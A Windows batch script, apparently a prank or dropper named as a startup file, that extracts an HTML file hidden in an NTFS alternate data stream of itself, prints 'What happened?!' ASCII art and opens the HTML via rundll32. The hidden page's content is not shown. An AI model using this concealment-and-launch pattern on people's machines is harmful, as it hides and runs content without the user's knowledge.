@ECHO OFF
cd /D "%~dp0"
timeout 2
PowerShell.exe -Command "$data = Get-Content .\startup3751243.bat:bannana.html -Encoding String -ReadCount 0; $data | Out-File bannana.html"


echo " _  _  _  _                     _     _                                               _  ____  ";
echo "| || || || |            _      | |   | |                                             | |(___ \ ";
echo "| || || || | _    ____ | |_    | |__ | |  ____  ____   ____    ____  ____    ____  _ | |    ) )";
echo "| ||_|| || || \  / _  ||  _)   |  __)| | / _  ||  _ \ |  _ \  / _  )|  _ \  / _  )/ || |   /_/ ";
echo "| |___| || | | |( ( | || |__   | |   | |( ( | || | | || | | |( (/ / | | | |( (/ /( (_| |   _   ";
echo " \______||_| |_| \_||_| \___)  |_|   |_| \_||_|| ||_/ | ||_/  \____)|_| |_| \____)\____|  (_)  ";
echo "                                               |_|    |_|                                      ";



timeout 2
rundll32.exe url.dll,FileProtocolHandler bannana.html